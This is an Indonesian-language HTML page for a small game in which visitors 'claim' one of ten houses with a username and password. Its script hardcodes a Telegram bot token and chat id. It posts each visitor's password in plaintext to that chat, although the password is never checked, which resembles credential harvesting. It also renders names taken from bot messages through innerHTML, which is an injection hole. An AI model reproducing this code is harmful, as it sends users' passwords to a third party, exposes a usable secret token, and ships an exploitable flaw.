<!DOCTYPE html>
<html>
<head>
  <title>UVOWORLD - Rumah Realtime</title>
  <style>
    body { font-family: sans-serif; text-align: center; background: #f0f0f0; }
    .jalan { display: flex; flex-wrap: wrap; justify-content: center; gap: 12px; margin-top: 30px; }
    .rumah {
      width: 120px; height: 120px; background: #cce; border: 2px solid #333;
      border-radius: 8px; display: flex; flex-direction: column; justify-content: center; align-items: center;
      font-weight: bold; cursor: pointer; box-shadow: 2px 2px 6px rgba(0,0,0,0.2);
    }
    .claimed { background: #aaffaa; }
    #formBox { margin-top: 20px; }
    input { padding: 6px; margin: 4px; border: 1px solid #aaa; border-radius: 5px; width: 200px; }
    button { padding: 8px 16px; background: #3399ff; border: none; color: white; border-radius: 5px; cursor: pointer; }
    button:hover { background: #2277cc; }
  </style>
</head>
<body>

<h1>üè° UVOWORLD</h1>
<p>Rumah 1‚Äì10 realtime dari bot Telegram</p>

<div class="jalan" id="jalan"></div>

<div id="formBox">
  <h3>Klaim / Edit Rumah</h3>
  <input id="nomorRumah" placeholder="Rumah ke-" type="number" min="1" max="10">
  <input id="username" placeholder="Username">
  <input id="password" placeholder="Password" type="password">
  <button onclick="klaim()">Klaim / Ganti Nama</button>
</div>

<script>
  const token = "7961343490:AAGKb3JPPVBj1egmQU0hq2VfZTFmlx1zpi8";
  const chat_id = "6501126879";
  const rumahList = Array(10).fill(null);

  function renderRumah() {
    const jalan = document.getElementById("jalan");
    jalan.innerHTML = "";
    for (let i = 0; i < 10; i++) {
      const div = document.createElement("div");
      div.className = "rumah" + (rumahList[i] ? " claimed" : "");
      div.innerHTML = `Rumah ${i + 1}<br><small>${rumahList[i] || "Belum diklaim"}</small>`;
      jalan.appendChild(div);
    }
  }

  function klaim() {
    const nomor = parseInt(document.getElementById("nomorRumah").value);
    const user = document.getElementById("username").value.trim();
    const pass = document.getElementById("password").value.trim();
    if (!nomor || !user || !pass || nomor < 1 || nomor > 10) return alert("Isi semua kolom dengan benar!");

    rumahList[nomor - 1] = user;
    renderRumah();

    const text = `üè† Rumah ${nomor} diklaim/ganti oleh ${user}\nüîí Password: ${pass}`;
    fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id, text })
    })
    .then(() => alert("‚úÖ Terkirim ke bot."))
    .catch(() => alert("‚ùå Gagal kirim ke bot."));
  }

  function ambilDataDariBot() {
    fetch(`https://api.telegram.org/bot${token}/getUpdates`)
      .then(res => res.json())
      .then(data => {
        const pesan = data.result;
        let teks = "";
        for (let i = pesan.length - 1; i >= 0; i--) {
          const msg = pesan[i]?.message?.text;
          if (msg && msg.includes("üè†")) {
            teks = msg;
            break;
          }
        }
        if (!teks) return;
        const lines = teks.split("\n");
        lines.forEach(line => {
          const match = line.match(/Rumah (\d+) (?:diklaim|ganti) oleh (.+)/);
          if (match) {
            const idx = parseInt(match[1]) - 1;
            const nama = match[2];
            if (idx >= 0 && idx < 10) rumahList[idx] = nama;
          }
        });
        renderRumah();
      });
  }

  ambilDataDariBot();
  setInterval(ambilDataDariBot, 5000);
</script>

</body>
</html>
